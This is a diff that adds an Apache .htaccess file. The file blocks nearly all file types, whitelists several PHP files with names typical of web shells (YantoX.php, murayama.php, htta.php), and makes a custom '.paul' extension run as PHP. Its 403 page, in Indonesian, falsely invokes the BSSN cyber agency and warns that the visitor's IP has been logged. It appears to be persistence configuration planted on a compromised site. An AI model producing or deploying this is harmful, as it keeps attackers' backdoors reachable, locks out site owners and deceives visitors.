@@ -1,0 +1,22 @@
+Options -Indexes
+
+<FilesMatch ".*\.(cgi|pl|py|pyc|pyo|php[1-9]?|inc|phar|phtml|aspx|asp|shtml|sh|exe|html|htm|alfa|suspected|env|cg|test|txt|zip|doc|docx|pdf|xlsx|jpg|jpeg|png|gif|fla|unknown)$"> 
+    Order Allow,Deny
+    Deny from all
+</FilesMatch>
+
+<FilesMatch "(?i).*(ph|sh|pj|env|cg).*">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+
+<FilesMatch '^(index.php|1.php6|htta.php|murayama.php|YantoX.php|ip.php|YantoX.php6|ip.php6)$'>
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+
+ErrorDocument 403 "<html><head><title>Akses Ditolak</title><style>body {font-family: Arial, sans-serif; color: #333; background-color: #f0f0f0; text-align: center; padding: 50px;} img {width: 150px; margin-bottom: 20px;} h1 {color: #d9534f;} p {font-size: 18px; margin-top: 0;} .ip {font-weight: bold; color: #0275d8;}</style></head><body><img src='https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/Logo_BSSN_new.png/1200px-Logo_BSSN_new.png' alt='Logo BSSN'><h1>403 - Akses Tidak Diperbolehkan</h1><p>Akses ke halaman ini tidak diizinkan. IP Anda telah dicatat.</p></body></html>"
+
+ErrorDocument 404 "<html><head><title>Halaman Tidak Ditemukan</title><style>body {font-family: Arial, sans-serif; color: #333; background-color: #f0f0f0; text-align: center; padding: 50px;} h1 {color: #ff6347;} p {font-size: 18px;}</style></head><body><h1>404 - Halaman Tidak Ditemukan</h1><p>Oops! Halaman yang Anda cari tidak ada.</p></body></html>"
+
+AddType Application/x-httpd-php .paul
